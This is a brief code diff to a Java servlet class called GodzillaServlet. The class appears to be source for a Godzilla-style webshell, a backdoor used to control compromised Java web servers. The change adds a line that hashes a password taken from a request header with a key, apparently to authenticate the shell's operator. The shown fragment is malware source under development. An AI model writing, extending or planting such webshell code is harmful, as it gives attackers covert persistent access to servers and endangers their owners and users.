@@ -119,6 +119,7 @@ public class GodzillaServlet extends ClassLoader implements Servlet {
         this.parseObj(obj);
         this.Pwd = this.request.getHeader("p");
         this.path = this.request.getHeader("path");
+        this.md5 = md5(this.Pwd + this.xc);
         StringBuffer output = new StringBuffer();
         String tag_s = "->|";
         String tag_e = "|<-";
